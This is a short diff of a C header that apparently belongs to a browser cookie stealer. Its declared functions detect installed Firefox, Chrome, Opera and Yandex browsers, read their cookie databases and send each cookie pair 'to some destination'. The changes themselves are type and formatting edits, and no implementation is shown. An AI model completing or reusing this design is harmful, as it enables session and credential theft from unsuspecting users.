@@ -20,11 +20,11 @@
 #ifndef browser_prediction
 
 typedef struct {
-        char*   user_path;
-        uint8_t FF;
-        uint8_t CH;
-        uint8_t OP;
-        uint8_t YA;
+        char* user_path;
+        bool  FF;
+        bool  CH;
+        bool  OP;
+        bool  YA;
     } 
 browser_prediction;
 #endif
@@ -32,16 +32,21 @@ browser_prediction;
 /* main.c prototypes. */
 
 /* Will form Firefox cookies path from current path to ./Profiles. */
-char* get_ff_cookies_path(char* curr_path);
+char*
+get_ff_cookies_path(char* curr_path);
 
 /* Will check what browsers are installed already. */
-browser_prediction check_browsers(char* local, char* roaming);
+browser_prediction
+check_browsers(char* local, char* roaming);
 
 /* Will execute cookies databases reader for every browser installed. */
-void collect_data(browser_prediction status);
+void
+collect_data(browser_prediction status);
 
 /* Will read cookies databases. */
-void get_sql(const char* sql_path, uint8_t bt);
+void
+get_sql(const char* sql_path, uint8_t bt);
 
 /* Will send single cookie pair to some destination. */
-uint8_t send_single_cookie(cookies_datatype* c_value);
+uint8_t
+send_single_cookie(cookies_datatype* c_value);
